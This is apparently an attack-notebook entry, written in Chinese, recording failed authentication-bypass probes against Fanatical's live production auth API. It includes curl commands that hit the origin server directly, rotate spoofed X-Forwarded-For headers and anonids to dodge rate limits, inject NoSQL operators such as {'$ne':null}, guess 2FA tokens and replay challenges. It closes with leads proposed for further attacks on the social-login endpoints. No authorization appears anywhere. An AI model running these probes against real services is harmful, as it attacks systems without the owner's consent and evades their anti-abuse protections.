# Fanatical /api/auth 挑战类型混淆面证否：suspicous-country / two-factor 强类型校验，challengeType/challengeId 类型注入与跨 action 重放均无效

- **code**: fanatical-auth-challenge-type-confusion-negative
- **kind**: poc
- **category**: auth-bypass
- **component**: Fanatical 认证 API（Heroku fan-api，/api/auth/*）
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机 Linux curl，ws15 源站直连（--noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 + Host: ws15.fanatical.com + X-Forwarded-Host: www.fanatical.com + 每请求唯一 XFF + 同一 UUIDv4 anonid）实测：register→202 {"type":"reCaptcha","action":"REGISTRATION"}、login→202 action:"LOGIN"；以该真实挑战记录投递 /api/auth/suspicous-country 与 /api/auth/two-factor，token{缺失/空/000000/123456/随机6位/UUID/ABCDEF}×v3_recaptcha{缺失/空/随机} 共 96+ 组合恒 404 {"message":"Challenge not found"}（two-factor 的 429 为 anonid 维度限速，换新 anonid+新挑战后同样 404）；challengeType/action/type 注入不改变 /api/auth/recaptcha 返回的 type/action（action 恒为 presession 最新状态）；challengeId 传 {"$ne":null}/{"$exists":true}/null/true/123/数组 均 404（严格字符串查找）；跨 anonid 为 Presession not found / Challenge not found；全程零 Set-Cookie 零 token。
- **path**: pocs/fanatical-auth-challenge-type-confusion-negative/poc.md
- **tags**: fanatical, api-auth, challenge, type-confusion, suspicious-country, two-factor, nosql-injection, negative, heroku-origin, anonid, x-forwarded-for
- **created_at**: 2026-11-11T21:39:53.268Z
- **engine**: https://ws15.fanatical.com/api/auth/suspicous-country

## 描述

Fanatical 生产认证 API 的挑战类型混淆面实测收口：服务端按挑战记录类型严格分派，reCaptcha 挑战无法被推到 suspiciousCountry/two-factor 校验分支；请求体类型字段、challengeId 对象/数组类型、跨 anonid/跨 action 重放均不产生绕过；该面关闭，勿再重复。

## 正文

```
# 负面情报：Fanatical /api/auth 挑战类型混淆面（证否）

## 结论
在无法通过 reCAPTCHA Enterprise 校验的前提下（真 token 也被评分循环，见 #2426/#2870），
`/api/auth/suspicous-country` 与 `/api/auth/two-factor` 无法被任何客户端可控输入触发：
服务端对挑战记录做严格类型绑定，reCaptcha 类型挑战一律 404。

## 实测事实（2026-11-11，ws15 源站直连）
- register → `202 {"type":"reCaptcha","challengeId":"...","action":"REGISTRATION"}`
- login → `202 {"type":"reCaptcha","challengeId":"...","action":"LOGIN"}`
- 上述真实 challengeId × token{缺失,"",000000,123456,随机6位,UUID,ABCDEF} × v3_recaptcha{缺失,"",随机}
  投递 `/api/auth/suspicous-country`（24 组）与 `/api/auth/two-factor`（32 组）→ 全部
  `404 {"message":"Challenge not found"}`（33B），零 Set-Cookie。
- 拼写正确的 `/api/auth/suspicious-country` → 404 0B（路由不存在）。
- `challengeType` / `action` / `type` 注入（suspiciousCountry|suspicousCountry|twoFactor|recaptcha|REGISTRATION|LOGIN）
  不改变 `/api/auth/recaptcha` 返回的 type/action；返回 action 恒等于 presession 最新状态
  （fresh register → REGISTRATION；先 register 后 login → LOGIN）。
- `challengeId` 传 `{"$ne":null}` / `{"$exists":true}` / `{"$regex":"^"}` / `{"$gt":""}` / null / true / 123 / ["有效cid"] / {}
  → 全部 404 Challenge not found（连 recaptcha 上持有有效挑战时也不匹配）→ 严格字符串查找，无 NoSQL 注入。
- 跨 anonid：无 presession 的 anonid → `404 {"message":"Presession not found"}`（34B）；有 presession 但陌生 cid → 404 Challenge not found。
- 缺 anonid → `403 "Request blocked"`。
- `/api/auth/two-factor` 限速键 = anonid/presession（换 XFF 仍 429；换 anonid 立即恢复为 404）；login/register 家族才是 XFF 首值键（kb#596）。
- 失败的两端点请求不污染 presession action（之后 recaptcha 仍回原 action）。

## 复现最小命令
```bash
ANON=$(uuidgen|tr 'A-Z' 'a-z'); XFF=198.51.100.77
R=$(curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 \
  -A "$ARTEX_UA" -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "X-Forwarded-For: $XFF" -H "anonid: $ANON" -H 'Content-Type: application/json' \
  -X POST -d '{"email":"probe@mail.tm","v3_recaptcha":"x","password":"TestPass123!"}' \
  https://ws15.fanatical.com/api/auth/register)
CID=$(echo "$R" | jq -r .challengeId)
curl -sk --noproxy '*' --resolve ws15.fanatical.com:443:3.33.161.45 \
  -A "$ARTEX_UA" -H 'Host: ws15.fanatical.com' -H 'X-Forwarded-Host: www.fanatical.com' \
  -H "X-Forwarded-For: 198.51.100.78" -H "anonid: $ANON" -H 'Content-Type: application/json' \
  -X POST -d "{\"challengeId\":\"$CID\",\"token\":\"123456\"}" \
  https://ws15.fanatical.com/api/auth/two-factor
# → 404 {"message":"Challenge not found"}
```

## 残余线索（别当面内重跑，值得另开意图）
1) 社交登录入口从未覆盖：`POST /api/auth/google-login-customer/ {}` → 400 0B；
   `POST /api/auth/facebook-login {}` → 500 {"err":"Unexpected Error"}；
   `POST /api/auth/fandom {}` → 400 {"code":"E801","message":"Fandom missing data"}——它们可能免 reCAPTCHA 直接签发会话。
2) `GET /api/auth/pre-check` → 404 0B（源站无此 GET 路由）。
3) reCaptcha 挑战记录与 action 绑定不对称：记录在 presession 内可跨 action 复用（recaptcha 端点不校验 action），
   但专用端点强校验 action——若将来能拿到任一非 reCaptcha 挑战，此不对称可再核。
```
